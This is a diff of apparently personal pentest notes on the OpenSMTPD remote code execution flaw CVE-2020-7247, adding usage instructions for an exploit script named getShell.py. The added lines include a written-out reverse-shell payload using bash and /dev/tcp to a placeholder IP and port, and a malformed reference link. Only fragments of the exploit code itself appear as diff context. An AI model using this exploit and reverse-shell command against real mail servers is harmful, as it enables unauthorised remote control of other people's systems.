@@ -1,8 +1,9 @@
 # opensmtpd
 
-## RCE
+
 
 v6.6.1 | v6.6.2
+
 
 ```
 
@@ -11,6 +12,12 @@ https://github.com/jopraveen/CVE-2020-7247
 ```
 
 Make sure to use on an open port
+
+```bash
+#usage python3 getShell.py <targetIp> <targetPort> <command>
+# example for reverse shell python3 getShell.py <TargetIp> <TargetPort> 'bash -c "exec bash -i &> /dev/tcp/IP/PORT <&1"'
+
+```
 
 ```bash
 import socket, time
@@ -84,3 +91,6 @@ print("Exploited")
 s.close()
 
 ```
+
+
+Reference https://https://github.com/jopraveen/CVE-2020-7247
